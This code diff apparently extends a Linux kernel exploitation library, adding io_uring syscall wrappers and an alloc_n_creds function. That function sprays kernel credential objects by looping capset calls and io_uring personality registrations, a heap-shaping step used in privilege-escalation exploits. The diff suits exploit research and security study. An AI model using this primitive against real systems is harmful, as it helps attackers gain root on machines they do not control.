@@ -3,7 +3,12 @@
 #include <kpwn/kernel.h>
 #include <kpwn/logger.h>
 #include <kpwn/utils.h>
+#include <linux/capability.h>
+#include <linux/io_uring.h>
 #include <stdarg.h>
+#include <sys/syscall.h>
+#include <unistd.h>
+
 // std headers not needed here after moving helpers to utils.c
 
 // helpers moved to utils.c
@@ -188,6 +193,42 @@ struct kchecksec_t kchecksec() {
     log_info("%s", check.capsh_first_lines);
 
   return check;
+}
+
+int uring_setup(unsigned entries, struct io_uring_params *p) {
+  memset(p, 0, sizeof(*p));
+  // ここではフラグ無しでOK。必要なら p->flags に IORING_SETUP_* を設定
+  return (int)syscall(SYS_io_uring_setup, entries, p);
+}
+
+int uring_register(int ring_fd, unsigned opcode, const void *arg,
+                   unsigned nr_args) {
+  return (int)syscall(SYS_io_uring_register, ring_fd, opcode, arg, nr_args);
+}
+
+int alloc_n_creds(int nr_creds) {
+  ASSERT_MSG(nr_creds > 0, "nr_creds must be greater than 0");
+
+  static struct io_uring_params params;
+  int ring_fd = SYSCHK_BAIL(uring_setup(1, &params));
+
+  struct __user_cap_header_struct cap_header = {
+      .version = _LINUX_CAPABILITY_VERSION_3,
+      .pid = 0,
+  };
+  struct __user_cap_data_struct cap_data[2];
+
+  SYSCHK_BAIL(syscall(__NR_capget, &cap_header, &cap_data));
+
+  REP(nr_creds) {
+    SYSCHK_BAIL(syscall(__NR_capset, &cap_header, &cap_data));
+    SYSCHK_BAIL(uring_register(ring_fd, IORING_REGISTER_PERSONALITY, NULL, 0));
+  }
+
+  log_debug("allocated %d creds = %lx bytes", nr_creds,
+            (unsigned long)nr_creds * 0xc0);
+
+  return ring_fd;
 }
 
 void *kbase = NULL;
